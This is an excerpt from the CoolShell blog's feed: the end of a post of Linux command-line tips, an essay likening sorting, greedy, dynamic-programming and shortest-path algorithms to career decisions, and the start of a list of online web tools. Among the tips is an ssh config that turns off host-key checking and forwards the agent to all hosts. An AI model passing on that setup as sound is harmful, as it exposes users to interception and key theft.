<ul>
<li>在 bash中，使用重定向到标准输出和标准错误。如： some-command &gt;logfile 2&gt;&amp;1。另外，要确认某命令没有把某个打开了的文件句柄重定向给标准输入，最佳实践是加上 &#8220;&lt;/dev/null&#8221;，把/dev/null重定向到标准输入。</li>
</ul>
<ul>
<li>使用 man ascii 来查看 ASCII 表。</li>
</ul>
<ul>
<li>在远端的 ssh 会话里，使用 screen 或 dtach 来保存你的会话。（参看《<a title="28个Unix/Linux的命令行神器" href="https://coolshell.cn/articles/7829.html" target="_blank">28个Unix/Linux的命令行神器</a>》）</li>
</ul>
<ul>
<li>要来debug Web，试试curl 和 curl -I 或是 wget 。我觉得debug Web的利器是firebug，curl和wget是用来抓网页的，呵呵。</li>
</ul>
<ul>
<li>把 HTML 转成文本： lynx -dump -stdin</li>
</ul>
<ul>
<li>如果你要处理XML，使用 xmlstarlet</li>
</ul>
<ul>
<li>对于 Amazon S3， s3cmd 是一个很方便的命令（还有点不成熟）</li>
</ul>
<ul>
<li>在 ssh中，知道怎么来使用ssh隧道。通过 -L or -D (还有-R) ，翻墙神器。</li>
</ul>
<ul>
<li>你还可以对你的ssh 做点优化。比如，.ssh/config 包含着一些配置：避免链接被丢弃，链接新的host时不需要确认，转发认证，以前使用压缩（如果你要使用scp传文件）：</li>
</ul>
<blockquote>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">TCPKeepAlive=yes
ServerAliveInterval=15
ServerAliveCountMax=6
StrictHostKeyChecking=no
Compression=yes
ForwardAgent=yes</pre>
</blockquote>
<ul>
<li>如果你有输了个命令行，但是你改变注意了，但你又不想删除它，因为你要在历史命令中找到它，但你也不想执行它。那么，你可以按下 Alt-# ，于是这个命令关就被加了一个#字符，于是就被注释掉了。</li>
</ul>
<p><b>数据处理 </b></p>
<ul>
<li>了解 sort 和 uniq 命令 (包括 uniq 的 -u 和 -d 选项).</li>
</ul>
<ul>
<li>了解用 cut, paste, 和 join 命令来操作文本文件。很多人忘了在cut前使用join。</li>
</ul>
<ul>
<li>如果你知道怎么用sort/uniq来做集合交集、并集、差集能很大地促进你的工作效率。假设有两个文本文件a和b已解被 uniq了，那么，用sort/uniq会是最快的方式，无论这两个文件有多大（sort不会被内存所限，你甚至可以使用-T选项，如果你的/tmp目录很小）</li>
</ul>
<blockquote>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">cat a b | sort | uniq &gt; c   # c is a union b 并集

cat a b | sort | uniq -d &gt; c   # c is a intersect b 交集

cat a b b | sort | uniq -u &gt; c   # c is set difference a - b 差集</pre>
</blockquote>
<ul>
<li>了解和字符集相关的命令行工具，包括排序和性能。很多的Linux安装程序都会设置LANG 或是其它和字符集相关的环境变量。这些东西可能会让一些命令（如：sort）的执行性能慢N多倍（注：就算是你用UTF-8编码文本文件，你也可以很安全地使用ASCII来对其排序）。如果你想Disable那个i18n 并使用传统的基于byte的排序方法，那就设置export LC_ALL=C （实际上，你可以把其放在 .bashrc）。如果这设置这个变量，你的sort命令很有可能会是错的。</li>
</ul>
<ul>
<li>了解 awk 和 sed，并用他们来做一些简单的数据修改操作。例如：求第三列的数字之和： awk &#8216;{ x += $3 } END { print x }&#8217;。这可能会比Python快3倍，并比Python的代码少三倍。</li>
</ul>
<ul>
<li>使用 shuf 来打乱一个文件中的行或是选择文件中一个随机的行。</li>
</ul>
<ul>
<li>了解sort命令的选项。了解key是什么（-t和-k）。具体说来，你可以使用-k1,1来对第一列排序，-k1来对全行排序。</li>
</ul>
<ul>
<li>Stable sort (sort -s) 会很有用。例如：如果你要想对两例排序，先是以第二列，然后再以第一列，那么你可以这样： sort -k1,1 | sort -s -k2,2</li>
</ul>
<ul>
<li>我们知道，在bash命令行下，Tab键是用来做目录文件自动完成的事的。但是如果你想输入一个Tab字符（比如：你想在sort -t选项后输入&lt;tab&gt;字符），你可以先按Ctrl-V，然后再按Tab键，就可以输入&lt;tab&gt;字符了。当然，你也可以使用$&#8217;\t&#8217;。</li>
</ul>
<ul>
<li>如果你想查看二进制文件，你可以使用hd命令（在CentOS下是hexdump命令），如果你想编译二进制文件，你可以使用bvi命令（<a href="http://bvi.sourceforge.net/" target="_blank">http://bvi.sourceforge.net/</a> 墙）</li>
</ul>
<ul>
<li>另外，对于二进制文件，你可以使用strings（配合grep等）来查看二进制中的文本。</li>
</ul>
<ul>
<li>对于文本文件转码，你可以试一下 iconv。或是试试更强的 uconv 命令（这个命令支持更高级的Unicode编码）</li>
</ul>
<ul>
<li>如果你要分隔一个大文件，你可以使用split命令（split by size）和csplit命令（split by a pattern）。</li>
</ul>
<p><b>系统调试</b></p>
<ul>
<li>如果你想知道磁盘、CPU、或网络状态，你可以使用 iostat, netstat, top (或更好的 htop), 还有 dstat 命令。你可以很快地知道你的系统发生了什么事。关于这方面的命令，还有iftop, iotop等（参看《<a title="28个Unix/Linux的命令行神器" href="https://coolshell.cn/articles/7829.html" target="_blank">28个Unix/Linux的命令行神器</a>》）</li>
</ul>
<ul>
<li>要了解内存的状态，你可以使用free和vmstat命令。具体来说，你需要注意 “cached” 的值，这个值是Linux内核占用的内存。还有free的值。</li>
</ul>
<ul>
<li>Java 系统监控有一个小的技巧是，你可以使用kill -3 &lt;pid&gt; 发一个SIGQUIT的信号给JVM，可以把堆栈信息（包括垃圾回收的信息）dump到stderr/logs。</li>
</ul>
<ul>
<li>使用 mtr 会比使用 traceroute 要更容易定位一个网络问题。</li>
</ul>
<ul>
<li>如果你要找到哪个socket或进程在使用网络带宽，你可以使用 iftop 或 nethogs。</li>
</ul>
<ul>
<li>Apache的一个叫 ab 的工具是一个很有用的，用quick-and-dirty的方式来测试网站服务器的性能负载的工作。如果你需要更为复杂的测试，你可以试试 siege。</li>
</ul>
<ul>
<li>如果你要抓网络包的话，试试 wireshark 或 tshark。</li>
</ul>
<ul>
<li>了解 strace 和 ltrace。这两个命令可以让你查看进程的系统调用，这有助于你分析进程的hang在哪了，怎么crash和failed的。你还可以用其来做性能profile，使用 -c 选项，你可以使用-p选项来attach上任意一个进程。</li>
</ul>
<ul>
<li>了解用ldd命令来检查相关的动态链接库。注意：<a title="ldd 的一个安全问题" href="https://coolshell.cn/articles/1626.html" target="_blank">ldd的安全问题</a></li>
</ul>
<ul>
<li>使用gdb来调试一个正在运行的进程或分析core dump文件。参看我写的《<a title="GDB中应该知道的几个调试方法" href="https://coolshell.cn/articles/3643.html" target="_blank">GDB中应该知道的几个调试方法</a>》</li>
</ul>
<ul>
<li>学会到 /proc 目录中查看信息。这是一个Linux内核运行时记录的整个操作系统的运行统计和信息，比如： /proc/cpuinfo, /proc/xxx/cwd, /proc/xxx/exe, /proc/xxx/fd/, /proc/xxx/smaps.</li>
</ul>
<ul>
<li>如果你调试某个东西为什么出错时，sar命令会有用。它可以让你看看 CPU, 内存, 网络, 等的统计信息。</li>
</ul>
<ul>
<li>使用 dmesg 来查看一些硬件或驱动程序的信息或问题。</li>
</ul>
<p>作者最后加了一个免责声明：Disclaimer: Just because you <i>can</i> do something in bash, doesn&#8217;t necessarily mean you should. ;) （全文完）<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8619.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/11/shell.01-150x150.png" alt="你可能不知道的Shell" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8619.html" class="wp_rp_title">你可能不知道的Shell</a></li><li ><a href="https://coolshell.cn/articles/7829.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/07/dstat_screenshot-150x150.png" alt="28个Unix/Linux的命令行神器" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7829.html" class="wp_rp_title">28个Unix/Linux的命令行神器</a></li><li ><a href="https://coolshell.cn/articles/9070.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/02/awk-150x150.jpg" alt="AWK 简明教程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9070.html" class="wp_rp_title">AWK 简明教程</a></li><li ><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png" alt="打造高效的工作环境 &#8211; Shell 篇" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 &#8211; Shell 篇</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/systemd-1-150x150.jpeg" alt="Linux PID 1 和 Systemd" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8883.html">应该知道的Linux技巧</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8883.html/feed</wfw:commentRss>
			<slash:comments>192</slash:comments>
		
		
			</item>
		<item>
		<title>程序算法与人生选择</title>
		<link>https://coolshell.cn/articles/8790.html</link>
					<comments>https://coolshell.cn/articles/8790.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Fri, 28 Dec 2012 01:00:50 +0000</pubDate>
				<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[Algorithm]]></category>
		<category><![CDATA[Job]]></category>
		<category><![CDATA[Programmer]]></category>
		<category><![CDATA[程序员]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8790</guid>

					<description><![CDATA[<p>每年一到要找工作的时候，我就能收到很多人给我发来的邮件，总是问我怎么选择他们的offer，去腾讯还是去豆瓣，去外企还是去国内的企业，去创业还是去考研，来北京还是...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8790.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8790.html">程序算法与人生选择</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright  wp-image-8797" src="https://coolshell.cn/wp-content/uploads/2012/12/choice.jpg" alt="" width="281" height="207" srcset="https://coolshell.cn/wp-content/uploads/2012/12/choice.jpg 402w, https://coolshell.cn/wp-content/uploads/2012/12/choice-300x220.jpg 300w, https://coolshell.cn/wp-content/uploads/2012/12/choice-368x270.jpg 368w" sizes="(max-width: 281px) 100vw, 281px" />每年一到要找工作的时候，我就能收到很多人给我发来的邮件，总是问我怎么选择他们的offer，去腾讯还是去豆瓣，去外企还是去国内的企业，去创业还是去考研，来北京还是回老家，该不该去创新工场？该不该去thoughtworks？……等等，等等。今年从7月份到现在，我收到并回复了60多封这样的邮件。我更多帮他们整理思路，帮他们明白自己最想要的是什么。（注：我以后不再回复类似的邮件了）。</p>
<p>我深深地发现，对于我国这样从小被父母和老师安排各种事情长大的人，当有一天，父母和老师都跟不上的时候，我们几乎完全不知道怎么去做选择。而我最近也离开了亚马逊，换了一个工作。又正值年底，就像去年的那篇《<a title="三个事和三个问题" href="https://coolshell.cn/articles/6142.html" target="_blank">三个故事和三个问题</a>》一样，让我想到写一篇这样的文章。</p>
<h4>几个例子</h4>
<p>当我们在面对各种对选择的影响因子的时候，如：城市，公司规模，公司性质，薪水，项目，户口，技术，方向，眼界…… 你总会发现，你会在几个公司中纠结一些东西，举几个例子：</p>
<ul>
<li>某网友和我说，他们去上海腾讯，因为腾讯的规模很大，但却发现薪水待遇没有豆瓣高（低的还不是一点），如果以后要换工作的话，起薪点直接关系到了以后的高工资。我说那就去豆瓣吧，他说豆瓣在北京，污染那么严重，又没有户口，生存环境不好。我说去腾讯吧，他说腾讯最近组织调整，不稳定。我说那就去豆瓣吧，慢公司，发展很稳当。他说，豆瓣的盈利不清楚，而且用Python，自己不喜欢。我说，那就去腾讯吧，……</li>
</ul>
<ul>
<li>还有一网友和我说，他想回老家，因为老家的人脉关系比较好，能混得好。但又想留在大城市，因为大城市可以开眼界。</li>
</ul>
<p><span id="more-8790"></span></p>
<ul>
<li>另一网友和我说，他想进外企，练练英语，开开眼界，但是又怕在外企里当个螺丝钉，想法得不到实施。朋友拉他去创业，觉得创业挺好的，锻炼大，但是朋友做的那个不知道能不能做好。</li>
</ul>
<ul>
<li>还有一网友在创新工场的某团队和考研之间抉择，不知道去创新工场行不行，觉得那个项目一般，但是感觉那个团队挺有激情的，另一方面觉得自己的学历还不够，读个研应该能找到更好的工作。</li>
</ul>
<ul>
<li>还有一些朋友问题我应该学什么技术？不应该学什么技术？或是怎么学会学得最快，技术的路径应该是什么？有的说只做后端不做前端，有的说，只做算法研究，不做工程，等等，等等。因为他们觉得人生有限，术业有专攻。</li>
</ul>
<ul>
<li>等等，等等……</li>
</ul>
<p>我个人觉得，如果是非计算机科班出生的人不会做选择，不知道怎么走也罢了，但是我们计算机科班出生的人是学过算法的，<strong>懂算法的人应该是知道怎么做选择的</strong>。</p>
<h4></h4>
<h4>排序算法</h4>
<p>你不可能要所有的东西，所以你只能要你最重要的东西，你要知道什么东西最重要，你就需要对你心内的那些欲望和抱负有清楚的认识，不然，你就会在纠结中度过。</p>
<p>所以，在选择中纠结的人有必要参考一下排序算法。</p>
<ul>
<li>首先，你最需要参考的就是“冒泡排序”——这种算法的思路就是每次冒泡出一个最大的数。所以，你有必要问问你自己，面对那些影响你选择的因子，如果你只能要一个的话，你会要哪个？而剩下的都可以放弃。于是，当你把最大的数，一个一个冒泡出来的时候，并用这个决策因子来过滤选项的时候，你就能比较容易地知道知道你应该选什么了。<strong>这个算法告诉我们，人的杂念越少，就越容易做出选择。</strong></li>
</ul>
<ul>
<li>好吧，可能你已茫然到了怎么比较两个决策因子的大小，比如：你分不清楚，工资&gt;业务前景吗？业务前景&gt;能力提升吗？所以你完全没有办法进行冒泡法。那你，你不妨参考一个“快速排序”的思路——这个算法告诉我们，我们一开始并不需要找到最大的数，我们只需要把你价值观中的某个标准拿出来，然后，把可以满足这个价值的放到右边，不能的放到左边去。比如，你的标准是：工资大于5000元&amp;&amp;业务前景长于3年的公司，你可以用这个标准来过滤你的选项。然后，你可以再调整这个标准再继续递归下去。<strong>这个算法告诉我们，我们的选择标准越清晰，我们就越容易做出选择</strong>。</li>
</ul>
<p>这是排序算法中最经典的两个算法了，面试必考。相信你已烂熟于心中了。所以，我觉得你把这个算法应用于你的人生选择也应该不是什么问题。关于在于，你是否知道自己想要的是什么？</p>
<p>排序算法的核心思想就是，<strong>让你帮助你认清自己最需要的是什么，认清自己最想要的是什么，然后根据这个去做选择</strong>。</p>
<h4>贪婪算法</h4>
<p>所谓贪婪算法，是一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择（注意：是当前状态下），从而希望导致结果是最好或最优的算法。贪婪算法最经典的一个例子就是<a title="Huffman 编码压缩算法" href="https://coolshell.cn/articles/7459.html" target="_blank">哈夫曼编码</a>。</p>
<p>对于人类来说，一般人在行为处事的时候都会使用到贪婪算法，</p>
<ul>
<li>比如在找零钱的时候，如果要找补36元，我们一般会按这样的顺序找钱：20元，10元，5元，1元。</li>
</ul>
<ul>
<li>或者我们在过十字路口的时候，要从到对角线的那个街区时，我们也会使用贪婪算法——哪边的绿灯先亮了我们就先过到那边去，然后再转身90度等红灯再过街。</li>
</ul>
<p>这样的例子有很多。对于选择中，大多数人都会选用贪婪算法，因为这是一个比较简单的算法，未来太复杂了，只能走一步看一步，在当前的状况下做出最利于自己的判断和选择即可。</p>
<p>有的人会贪婪薪水，有的人会贪婪做的项目，有的人会贪婪业务，有的人会贪婪职位，有的人会贪婪自己的兴趣……这些都没什么问题。贪婪算法并没有错，虽然不是全局最优解，但其可以让你找到局部最优解或是次优解。其实，有次优解也不错了。<strong>贪婪算法基本上是一种急功近利的算法，但是并不代表这种算法不好，如果贪婪的是一种长远和持续，又未尝不可呢？</strong>。</p>
<h4>动态规划</h4>
<p>但是我们知道，对于大部分的问题，贪婪法通常都不能找出最优解，因为他们一般没有测试所有可能的解。<strong>因为贪婪算法是一种短视的行为，只会跟据当前的形式做判断，也就是过早做决定</strong>，因而没法达到最佳解。</p>
<p>动态规划和贪婪算法的最大不同是，贪婪算法做出选择，不能在过程优化。动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，会动态优化功能。</p>
<p>动态规划算法至少告诉我们两个事：</p>
<p style="padding-left: 30px;">1）<strong>承前启后非常重要，</strong>当你准备去做遍历的时候，你的上次的经历不但能开启你以后的经历，而且还能为后面的经历所用。你的每一步都没有浪费。</p>
<p style="padding-left: 30px;">2）<strong>是否可以回退也很重要</strong>。这意思是——如果你面前有两个选择，一个是A公司一个是B公司，如果今天你选了A公司，并不是你完全放弃了B公司。而是，你知道从A公司退出来去B公司，会比从B公司退出来去A公司要容易一些。</p>
<p>比如说：你有两个offer，一个是Yahoo，一个是Baidu，上述的第一点会让我们思考，我以前的特长和能力更符合Yahoo还是Baidu？而Yahoo和Baidu谁能给我开启更大的平台？上述的第二点告诉我们，是进入Yahoo后如果没有选好，是否还能再选择Baidu公司？还是进入Baidu公司后能容易回退到Yahoo公司？</p>
<h4><b>Dijkstra</b>最短路径</h4>
<p>最短路径是一个Greedy + DP的算法。相当经典。这个算法的大意如下：</p>
<p style="padding-left: 30px;">1）在初始化的时候，所有的结点都和我是无穷大，默认是达不到的。</p>
<p style="padding-left: 30px;">2）从离自己最近的结点开始贪婪。</p>
<p style="padding-left: 30px;">3）走过去，看看又能到达什么样的结点，计算并更新到所有目标点的距离。</p>
<p style="padding-left: 30px;">4）再贪婪与原点最短的结点，如此反复。</p>
<p>这个算法给我们带来了一些这样的启示：</p>
<ul>
<li>有朋友和我说过他想成为一个架构师，或是某技术领域的专家，并会踏踏实实的向这个目标前进，永不放弃。我还是鼓励了他，但我也告诉他了这个著名的算法，我说，这个算法告诉你，架构师或某领域的专家对你来说目前的距离是无穷大，他们放在心中，先看看你能够得着的东西。<strong>所谓踏实，并不是踏踏实实追求你的目标，而是踏踏实实把你够得着看得见的就在身边的东西干好。</strong>我还记得我刚参加工作，从老家出来的时候，从来没有想过要成为一个技术牛人，也从来没有想过我的博客会那么的有影响力，在做自己力所能及，看得见摸得着的事情，我就看见什么技术就学什么，学着学着就知道怎么学更轻松，怎么学更扎实，这也许就是我的最短路径。</li>
</ul>
<ul>
<li>有很多朋友问我要不要学C++，或是问我学Python还是学Ruby，是不是不用学前端，等等。这些朋友告诉我，他们不可能学习多个语言，学了不用也就忘了，而且术业有专攻。这并没有什么不对的，只是我个人觉得，学习一个东西没有必要只有两种状态，一种是不学，另一种是精通。了解一个技术其实花不了多少时间，我学C++的目的其实是为了更懂Java，学TCP/IP协议其实是为了更懂Socket编程，很多东西都是连通和相辅相成的，学好了C/C++/Unix/TCP等这些基础技术后，我发现到达别的技术路径一下缩短了（这就是为什么<a title="Go 语言简介（下）— 特性" href="https://coolshell.cn/articles/8489.html" target="_blank">我用两天时间就可以了解Go语言的原因</a>）。<strong>这就好像这个算法一样，算法效率不高，也许达到你的目标，你在一开始花了很长时间，遍历了很多地方，但是，这也许这就是你的最短路径（</strong>比起你达不到要好得多<strong>）</strong>。</li>
</ul>
<h4>算法就是Trade-Off</h4>
<p>你根本没有办法能得到所有你想得到的东西，<strong>任何的选择都意味着放弃</strong>——<strong>当你要去获得一个东西的时候，你总是需要放弃一些东西</strong>。<strong>人生本来就是一个跷跷板，一头上，另一头必然下</strong>。这和我们做软件设计或算法设计一样，用时间换空间，用空间换时间，还有CAP理论，总是有很多的Trade-Off，正如这个短语的原意一样——<strong>你总是要用某种东西去交易某种东西</strong>。</p>
<p>我们都在用某种东西在交易我们的未来，有的人用自己的努力，有的人用自己的思考，有的人用自己的年轻，有的人用自己的自由，有的人用自己的价值观，有的人用自己的道德…… …… 有的人在交换金钱，有的人在交换眼界，有的人在交换经历，有的人在交换地位，有的人在交换能力，有的人在交换自由，有的人在交换兴趣，有的人在交换虚荣心，在交换安逸享乐…… ……</p>
<p><strong>每个人有每个人的算法，每个算法都有每个算法的purpose，就算大家在用同样的算法，但是每个人算法中的那些变量、开关和条件都不一样，得到的结果也不一样。我们就是生活在Matrix里的一段程序，我们每个人的算法决定着我们每个人的选择，我们的选择决定了我们的人生</strong>。</p>
<p style="text-align: center;"><span style="color: #ff0000; font-size: 14px;" data-mce-mark="1"><strong>2012年就要过去了，祝大家新年快乐！</strong></span></p>
<figure id="attachment_8798" aria-describedby="caption-attachment-8798" style="width: 640px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-8798 " src="https://coolshell.cn/wp-content/uploads/2012/12/life_of_pi_.jpg" alt="插图来自电影 Life of Pi" width="640" height="275" srcset="https://coolshell.cn/wp-content/uploads/2012/12/life_of_pi_.jpg 640w, https://coolshell.cn/wp-content/uploads/2012/12/life_of_pi_-300x128.jpg 300w" sizes="(max-width: 640px) 100vw, 640px" /><figcaption id="caption-attachment-8798" class="wp-caption-text">插图来自电影 Life of Pi</figcaption></figure>
<p>（全文完）<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/17583.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/12/people-150x150.jpg" alt="技术人员的发展之路" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17583.html" class="wp_rp_title">技术人员的发展之路</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/8138.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/250px-Sheldon_Cooper-150x150.jpg" alt="为什么我反对纯算法面试题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8138.html" class="wp_rp_title">为什么我反对纯算法面试题</a></li><li ><a href="https://coolshell.cn/articles/6142.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/12/amazon_global_selling-150x150.jpg" alt="三个事和三个问题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6142.html" class="wp_rp_title">三个事和三个问题</a></li><li ><a href="https://coolshell.cn/articles/3231.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/12.jpg" alt="你和你的工作" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3231.html" class="wp_rp_title">你和你的工作</a></li><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8790.html">程序算法与人生选择</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8790.html/feed</wfw:commentRss>
			<slash:comments>220</slash:comments>
		
		
			</item>
		<item>
		<title>Web工程师的工具箱</title>
		<link>https://coolshell.cn/articles/8767.html</link>
					<comments>https://coolshell.cn/articles/8767.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Tue, 18 Dec 2012 16:04:43 +0000</pubDate>
				<category><![CDATA[Web开发]]></category>
		<category><![CDATA[杂项资源]]></category>
		<category><![CDATA[编程工具]]></category>
		<category><![CDATA[AutoTools]]></category>
		<category><![CDATA[HTTP]]></category>
		<category><![CDATA[http load]]></category>
		<category><![CDATA[test]]></category>
		<category><![CDATA[Web]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8767</guid>

					<description><![CDATA[<p>本文出自Ivan Zuzak 的《The Web engineer&#8217;s online toolbox》，作者给了一个各种可以用来进行开发、测试、调试...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8767.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8767.html">Web工程师的工具箱</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright  wp-image-8771" alt="Web Toolbox" src="https://coolshell.cn/wp-content/uploads/2012/12/webtoolbox.jpg" width="318" height="196" srcset="https://coolshell.cn/wp-content/uploads/2012/12/webtoolbox.jpg 397w, https://coolshell.cn/wp-content/uploads/2012/12/webtoolbox-300x185.jpg 300w" sizes="(max-width: 318px) 100vw, 318px" />本文出自<a href="http://ivanzuzak.info/" target="_blank">Ivan Zuzak</a> 的《<a href="http://ivanzuzak.info/2012/11/18/the-web-engineers-online-toolbox.html" target="_blank">The Web engineer&#8217;s online toolbox</a>》，作者给了一个各种可以用来进行开发、测试、调试以及文档编排的在线工具集。（注：我发现CSDN上已经有了这篇文章《<a href="http://www.csdn.net/article/2012-11-19/2811992" target="_blank">Web工程师必备的18款工具</a>》，但可惜的是这篇文章并不全（原文后来被更新到了33个工具），而且其中并没有包括原文评论中出现的所有工具，所以，我一并补全了更出来，一共40多个工具）</p>
<h4><strong>Web工程师在线工具箱</strong></h4>
<ul>
<li><a href="http://requestb.in/" target="_blank"><strong>RequestBin</strong></a><strong>：</strong>允许你创建一个URL，利用这款工具进行收集请求，然后通过个性化方式进行检查。</li>
</ul>
<ul>
<li><a href="http://hurl.it/" target="_blank"><strong>Hurl</strong></a><strong>：</strong>发出HTTP请求，输入URL，设置标题，查看响应，最后分享给其他人。类似的工具有：<a href="http://resttesttest.com/" target="_blank">REST test test</a>, <a href="https://apigee.com/console/others" target="_blank">Apigee console</a>.。</li>
</ul>
<ul>
<li><a href="http://httpbin.org/" target="_blank"><strong>Httpbin</strong></a><strong>：</strong>HTTP请求&amp;响应服务，涵盖所有的HTTP方案（例如不同的HTTP verbs、状态代码和重定向）。类似工具：<a href="http://ivanzuzak.info/urlecho/">UrlEcho</a>。</li>
</ul>
<ul>
<li><a href="http://redbot.org/" target="_blank"><strong>REDbot</strong></a><strong>：</strong>这是一个机器人工具，帮助用户检查HTTP资源，可查看它的操作情况，指出常见的问题并提出改进。类似工具：<a href="http://zamez.org/httplint">HTTP lint</a>。</li>
</ul>
<ul>
<li><a href="http://webgun.io/" target="_blank"><strong>WebGun</strong></a><strong>：</strong>用于创建webhooks模板的API。类似工具：<a href="https://github.com/izuzak/urlreq">UrlReq</a>。</li>
</ul>
<ul>
<li><strong><a href="https://www.webscript.io/">Webscript</a> </strong> 自选一个url，填一段Lua代码，就能对访问做各种respond，还可以主动运行任务，cron job等等&#8230;</li>
</ul>
<p><span id="more-8767"></span></p>
<ul>
<li><strong><a href="http://www.clickhooks.com/">ClickHooks</a> </strong>这是一个短网址服务， 当用户访问了你的这个短网址跳转链接，服务器会通过HTTP POST的方式回调你的一个URL。这也是一种WebHooks方式。（陈皓注：所谓WebHooks，你可以理解为一种trigger，或是一种handler，比如当你你提交了代码，会调用某个URL链接以POST的方式告诉那个网站你提交了代码（如：发一个twitter 之类的，或是通知某个bug tracker系统））</li>
</ul>
<ul>
<li><strong><a href="http://mailhooks2.appspot.com/">MailHooks</a> </strong>让你可以通过HTTP POST方法收电子邮件（又叫WebHooks），你可以为你的一个邮件地址创建N多的hooks，当一个邮件收到了，可以把这个邮件以POST的方式发到你的某个URL上去。</li>
</ul>
<ul>
